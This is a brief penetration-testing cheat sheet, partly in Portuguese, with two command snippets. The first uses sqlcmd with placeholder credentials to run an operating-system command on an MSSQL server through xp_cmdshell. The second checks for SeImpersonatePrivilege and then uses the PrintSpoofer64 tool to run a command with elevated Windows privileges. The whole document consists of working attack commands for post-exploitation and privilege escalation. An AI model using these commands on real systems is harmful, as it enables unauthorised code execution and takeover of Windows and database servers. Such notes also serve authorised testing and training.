#### Connect on Mssql from PowerShell
```powershell
sqlcmd -S '[INSTANCE]' -U '[USER]' -P '[PASS]' -Q "EXEC xp_cmdshell 'whoami';"
```
#### SeImpersonatePrivilege
Após verificar se temos p privilégio de `SeImpersonatePrivilege`, baixamos a tool `PrintSpoofer64.exe`.
```powershell
./PrintSpoofer64.exe -i -c "whoami"
```